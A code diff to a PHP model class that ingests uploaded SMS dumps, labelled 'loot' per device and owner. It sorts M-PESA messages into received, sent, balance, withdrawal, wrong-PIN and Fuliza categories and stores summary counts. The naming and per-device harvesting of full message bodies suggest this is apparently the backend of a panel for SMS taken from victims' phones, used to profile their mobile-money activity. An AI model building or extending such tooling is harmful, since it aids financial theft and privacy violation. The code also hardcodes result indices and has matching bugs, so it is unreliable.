@@ -59,7 +59,12 @@ class ModUploads extends Model
         $data2 = json_decode($data1);
 
         $receive = "Confirmed.You have received Ksh";
+        $receive2 = "Confirmed. You have received Ksh";
         $sent = " Confirmed. Ksh";
+        $withdrew = "Confirmed.on";
+        $balance = "Confirmed. Your account balance";
+        $wrong_pin = "You have entered the wrong PIN.";
+        $fuliza = "Confirmed. Fuliza M-PESA";
         $count_sent = 0; $count_receive = 0; $count_other = 0;
 
         foreach ($data2 as $smsdata) {
@@ -68,9 +73,22 @@ class ModUploads extends Model
 
                 if (stripos($sms_clean, $receive)){
                     $count_receive+=1;
+                    $sms_cat = "Received";
                 }else if (stripos($sms_clean, $sent)){
                     $count_sent+=1;
-                }else{
+                    $sms_cat = "Sent";
+                }else if (stripos($sms_clean, $withdrew) ){
+                    $sms_cat = "Withdrew";
+                }else if (stripos($sms_clean, $balance)){
+                    $sms_cat = "Balance";
+                }else if (stripos($sms_clean, $receive2)){
+                    $sms_cat = "Received";
+                }else if (stripos($sms_clean, $wrong_pin)){
+                    $sms_cat = "Wrong Pin";
+                }else if (stripos($sms_clean, $fuliza)){
+                    $sms_cat = "Fuliza";
+                }else {
+                    $sms_cat = "Unknown";
                     $count_other+=1;
                 }
 
@@ -80,6 +98,7 @@ class ModUploads extends Model
                     'sms_number' => $smsdata->Number,
                     'sms_thread_id' => $smsdata->$thread_id,
                     'sms_time' => $smsdata->Date,
+                    'sms_category' => $sms_cat,
                     'sms_seen' => $smsdata->Seen,
                     'sms__id' => $smsdata->ID,
                     'sms_body' => $smsdata->Body,
@@ -91,12 +110,30 @@ class ModUploads extends Model
             }
         }
 
+        $builder1 = $this->db->table('tbl_Sms');
+        $get_all = $builder1
+            ->select('sms_category, COUNT(*) as counted')
+            ->where('sms_device', $loot_device)
+            ->where('sms_owner', $loot_owner)
+            ->where('sms_loot_source', $loot_uuid)
+            ->groupBy('sms_category')
+            ->get();
+        $loot_summary_sms_categories =  $get_all->getResult();
+
+        //print("<pre>".print_r($loot_summary_sms_categories,true)."</pre>");
+
+        $all_count = $loot_summary_sms_categories[0]->counted + $loot_summary_sms_categories[1]->counted + $loot_summary_sms_categories[2]->counted + $loot_summary_sms_categories[3]->counted + $loot_summary_sms_categories[4]->counted + $loot_summary_sms_categories[5]->counted + $loot_summary_sms_categories[6]->counted;
+
         $data1 = array(
             'Loot_Uuid' => $loot_uuid,
-            'info_Received' => $count_receive,
-            'info_Sent' => $count_sent,
-            'info_Unknown' => $count_other,
-            'info_All' => $count_receive + $count_sent + $count_other,
+            'info_Received' => $loot_summary_sms_categories[2]->counted,
+            'info_Sent' => $loot_summary_sms_categories[3]->counted,
+            'info_Unknown' => $loot_summary_sms_categories[4]->counted,
+            'info_Balance' => $loot_summary_sms_categories[0]->counted,
+            'info_Fuliza' => $loot_summary_sms_categories[1]->counted,
+            'info_Withdrew' => $loot_summary_sms_categories[5]->counted,
+            'info_Wrong_Pin' => $loot_summary_sms_categories[6]->counted,
+            'info_All' => $all_count,
             'loot_Created' => $dated
         );
         $this->db ->table('tbl_Loot_Summary')->insert($data1);
@@ -123,6 +160,14 @@ class ModUploads extends Model
                 ->where($print_dump)
                 ->get();
         return $get_all->getResult();
+    }
+
+    public function get_loot_uuid($loot_name){
+        $builder = $this->db->table('tbl_Loot');
+        $get_all = $builder->select('loot_Uuid')
+                ->where('loot_Name', $loot_name)
+                ->get();
+        return $get_all->getResult()[0]->loot_Uuid;
     }
     
     public function device_make_print($print_dump){
